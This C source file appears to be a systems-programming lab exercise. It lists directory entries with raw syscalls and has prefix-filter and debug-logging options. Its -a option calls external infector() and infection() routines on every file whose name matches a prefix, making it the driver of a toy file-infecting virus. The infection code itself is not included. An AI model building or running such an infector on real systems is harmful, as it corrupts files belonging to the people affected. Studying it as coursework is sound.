#include "util.h"

#define SYS_EXIT 1
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_UNLINK 10
#define SYS_LSEEK 19
#define SYS_GETDENTS 141
#define STDIN 0
#define STDOUT 1
#define STDERR 2
#define SEEK_SET 0
#define SEEK_CUR 1
#define SEEK_END 2

typedef struct ent ent;
extern int system_call(int, ...);
extern int code_start();
extern int code_end();
extern int infector(char *filename);
extern int infection();

void recordDebug(unsigned short len, char *name, int tmp_file);
void debug_file(int sysId, int ret, int tmp_file);
void print_debugFile(int tmp_file);
void printFilename(char *filename, int tmp_file);
void printFiletype(char type, int tmp_file);
void prefix_print(char *pref, char *filename, char type, int tmp_file);
void attach(char *pref, char *filename, int tmp_file);
void exitErr(int code);

typedef struct ent{
    long inode;
    int offset;
    unsigned short len;
    char name[1];
    } ent;

int main (int argc , char* argv[], char* envp[]){
    int i, flagD, flagP, flagA, fd, count, tmp_file;
    char *p_prefix, *a_prefix, buf[8192];
    ent *entp = (ent*)buf;
    
    tmp_file = system_call(SYS_OPEN,"tmp",64|2,0777);
    if(tmp_file < 0) system_call(SYS_EXIT, 85);
    debug_file(SYS_OPEN, tmp_file, tmp_file);

    for (i = 1; i < argc; i++){
        if(strcmp(argv[i], "-D") == 0) flagD = 1;
        if(strncmp(argv[i], "-p", 2) == 0){
            flagP = 1;
            p_prefix = argv[i]+2;
            system_call(SYS_WRITE,STDOUT,"flag p is on and argv[i]+2 is:\n",31);
            system_call(SYS_WRITE,STDOUT,argv[i]+2,strlen(argv[i]+2));
            system_call(SYS_WRITE,STDOUT,"flag p is on\n",13);
        }
        if(strncmp(argv[i], "-a", 2) == 0){
            flagA = 1;
            a_prefix = argv[i]+2;
        }
    }

    i = system_call(SYS_WRITE,STDOUT,"Flame 2 strikes!\n",17);
    debug_file(SYS_WRITE, i, tmp_file);
    
    fd = system_call(SYS_OPEN,".",0,0);
    debug_file(SYS_OPEN, fd, tmp_file);
    if(fd < 0) exitErr(85);
    
    count = system_call(SYS_GETDENTS,fd,buf,8192);
    debug_file(SYS_GETDENTS, count, tmp_file);
    
    if(flagA){
        /*print adresses of code_start and code_end*/
        system_call(SYS_WRITE,STDOUT,itoa((int)code_start),strlen(itoa((int)code_start)));
        system_call(SYS_WRITE,STDOUT,"\n",1);
        system_call(SYS_WRITE,STDOUT,itoa((int)code_end),strlen(itoa((int)code_end)));
        system_call(SYS_WRITE,STDOUT,"\n",1);
    }
    i = 0;
    while(i < count){
        entp = (ent*)(buf+i);
        if(flagP) prefix_print(p_prefix, entp->name, buf[(i-1)+(entp->len)], tmp_file); 
        else if(flagA) attach(a_prefix,entp->name, tmp_file);
        else printFilename(entp->name, tmp_file);
        recordDebug(entp->len, entp->name, tmp_file);
        i = i + entp->len;
    }

    fd = system_call(SYS_CLOSE,fd);
    debug_file(SYS_CLOSE, fd, tmp_file);
    if(fd < 0) exitErr(85);
    
    if(flagD) {
        print_debugFile(tmp_file);
    }
    system_call(SYS_CLOSE, tmp_file);
    system_call(SYS_UNLINK, "tmp");
    return 0;
}

void printFilename(char *filename, int tmp_file){
    int write = system_call(SYS_WRITE,STDOUT,filename,strlen(filename));
    debug_file(SYS_WRITE, write, tmp_file);
    write = system_call(SYS_WRITE,STDOUT,"\n",1);
    debug_file(SYS_WRITE, write, tmp_file);
}

void printFiletype(char type, int tmp_file){
    int write = system_call(SYS_WRITE,STDOUT,itoa(type),1);
    debug_file(SYS_WRITE, write, tmp_file);
    write = system_call(SYS_WRITE,STDOUT,"\n",1);
    debug_file(SYS_WRITE, write, tmp_file);
}

void prefix_print(char *pref, char *filename, char type, int tmp_file){
    if( strncmp(pref, filename, strlen(pref)) == 0 ){    
        printFilename(filename, tmp_file);
        printFiletype(type, tmp_file);
    }
}

void attach(char *pref, char *filename, int tmp_file){
    if( strncmp(pref, filename, strlen(pref)) == 0 ){ 
        infector(filename);
        infection();
        printFilename(filename, tmp_file);
    }
}

void recordDebug(unsigned short len, char *name, int tmp_file){
    system_call(SYS_WRITE,tmp_file,"Record's length: ",17);
    system_call(SYS_WRITE,tmp_file,itoa(len),strlen(itoa(len)));
    system_call(SYS_WRITE,tmp_file,"   ",3);
    system_call(SYS_WRITE,tmp_file,"Record's name: ",15);
    system_call(SYS_WRITE,tmp_file,name,strlen(name));
    system_call(SYS_WRITE,tmp_file,"\n",1);
    
}

void debug_file(int sysId, int ret, int tmp_file){
    system_call(SYS_WRITE,tmp_file,"system call ID: ",16);
    system_call(SYS_WRITE,tmp_file,itoa(sysId),strlen(itoa(sysId)));
    system_call(SYS_WRITE,tmp_file,"   ",3);
    system_call(SYS_WRITE,tmp_file,"return value: ",14);
    system_call(SYS_WRITE,tmp_file,itoa(ret),strlen(itoa(ret)));
    system_call(SYS_WRITE,tmp_file,"\n",1);
}

void print_debugFile(int fd){
    int read;
    char c[1];
    system_call(SYS_LSEEK, fd, 0, SEEK_SET);
    read = system_call(SYS_READ, fd, c, 1);
    while(read){
        system_call(SYS_WRITE,STDERR,c,1);
        read = system_call(SYS_READ, fd, c, 1);
    }
}

void exitErr(int code){
    system_call(SYS_EXIT, code, 0, 0);
}